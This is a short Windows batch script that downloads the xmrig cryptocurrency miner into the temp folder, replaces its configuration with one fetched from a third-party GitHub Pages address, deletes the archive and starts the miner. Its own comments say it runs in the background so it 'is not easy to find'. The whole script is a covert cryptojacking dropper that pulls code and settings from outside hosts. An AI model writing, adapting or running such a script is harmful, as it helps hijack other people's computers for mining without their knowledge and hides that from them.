@REM This program can quick setup xmrig
@REM This xmrig run in the background
@REM So It is not easy to find
call powershell -command "Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-msvc-win64.zip -OutFile %TEMP%/win.zip"
cd %TEMP%
call powershell -command "Expand-Archive win.zip"
call powershell -command "rm win/xmrig-6.17.0/config.json"
call powershell -command "Invoke-WebRequest https://yeh-john.github.io/xmrig/config.json -OutFile win/xmrig-6.17.0/config.json"
call powershell -command "rm win.zip"
cd win/xmrig-6.17.0
start cmd /c "xmrig.exe"
